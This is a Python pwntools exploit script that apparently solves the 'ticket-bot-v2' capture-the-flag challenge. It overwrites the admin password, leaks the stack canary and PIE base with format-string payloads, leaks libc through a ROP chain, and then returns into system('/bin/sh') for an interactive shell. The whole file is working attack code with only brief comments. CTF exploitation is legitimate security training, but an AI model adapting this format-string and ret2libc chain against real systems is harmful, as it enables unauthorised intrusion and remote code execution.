from pwn import *

REMOTE = True

if REMOTE:
    r = remote("ticket-bot-v2.challs.csc.tf", 1337)
else:
    r = process("./attachment/chal")

sla = r.sendlineafter
sa = r.sendafter


def new_ticket(ticket):
    sla(b"========================\n", b"1")
    sla(b"Please tell me why your here:\n", ticket)


def login(password):
    sla(b"========================\n", b"3")
    sla(b"Admin Password\n", str(password).encode())


def change_password(password):
    sla(b"========================\n", b"1")
    sla(b"Enter new Password\n", password)


# overwrite admin password with 0

sla(b"Please tell me why your here:\n", b"A")  # 0

for i in range(4):
    new_ticket(b"A")  # 1 ~ 4

new_ticket(p64(0))


# leak canary

login(0)

change_password(b"%7$p")
r.recvuntil(b"0x")
canary = int(r.recvuntil(b"=")[:-1], 16)
log.info(f"canary: {hex(canary)}")


# leak pie

login(0)

change_password(b"%9$p")
r.recvuntil(b"0x")
pie = int(r.recvuntil(b"=")[:-1], 16) - 0x16A6
log.info(f"pie base: {hex(pie)}")

puts_plt = pie + 0x1120
printf_plt = pie + 0x1160
menu = pie + 0x1756
pop_rdi = pie + 0x18D3  # pop rdi; ret;
puts_got = pie + 0x3F68


# leak libc

login(0)

payload = b"A" * 0x8
payload += p64(canary)
payload += b"A" * 0x8

# printf(puts_got)
payload += p64(pop_rdi + 1)  # ret (for stack alignment)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(printf_plt)

# return to menu()
payload += p64(pop_rdi + 1)  # ret (for stack alignment)
payload += p64(menu)

change_password(payload)

r.recvuntil(b"AAAA")
if REMOTE:
    libc = u64(r.recvuntil(b"=")[:-1].ljust(8, b"\x00")) - 0x84420
else:
    libc = u64(r.recvuntil(b"=")[:-1].ljust(8, b"\x00")) - 0x87BD0
log.info(f"libc base: {hex(libc)}")

if REMOTE:
    system = libc + 0x52290
    binsh = libc + 0x1B45BD
else:
    system = libc + 0x58740
    binsh = libc + 0x1CB42F


# get shell

login(0)

payload = b"A" * 0x8
payload += p64(canary)
payload += b"A" * 0x8

# system("/bin/sh")
payload += p64(pop_rdi + 1)  # ret (for stack alignment)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

change_password(payload)


r.interactive()
